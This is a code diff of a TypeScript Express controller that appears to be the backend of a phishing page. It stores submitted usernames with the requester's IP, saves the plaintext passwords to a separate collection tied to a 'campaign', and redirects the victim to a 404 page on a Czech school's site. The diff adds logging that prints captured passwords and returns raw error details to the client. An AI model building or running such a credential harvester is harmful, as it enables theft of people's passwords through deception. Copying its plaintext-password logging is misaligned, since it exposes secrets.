@@ -6,8 +6,8 @@ export const credentialController = {
   async create(req: Request, res: Response) {
     try {
       const { username, password, campaignId } = req.body;
+      console.log('Received request:', { username, campaignId });
       
-      // Uložení credentials bez hesla
       const credential = new Credential({
         username,
         ipAddress: req.ip,
@@ -15,23 +15,29 @@ export const credentialController = {
         campaign: campaignId
       });
       
+      console.log('Created credential:', credential);
       await credential.save();
-
-      // Uložení username+heslo do druhé kolekce
+      console.log('Saved credential');
+  
       const passwordEntry = new Password({
         username,
         password,
-        credential: credential._id  // Reference na původní credential
+        credential: credential._id
       });
-
+  
+      console.log('Created password entry:', passwordEntry);
       await passwordEntry.save();
+      console.log('Saved password');
       
       res.status(201).json({ 
         redirect: 'https://www.prumyslovkaliberec.cz/404'
       });
-    } catch (error) {
-      console.error('Error saving data:', error);
-      res.status(500).json({ error: 'Internal server error' });
+    } catch (error: any) { // Přidáno typování error jako any
+      console.error('Detailed error:', error);
+      res.status(500).json({ 
+        error: 'Internal server error',
+        details: error.message || 'Unknown error occurred'
+      });
     }
   }
 };
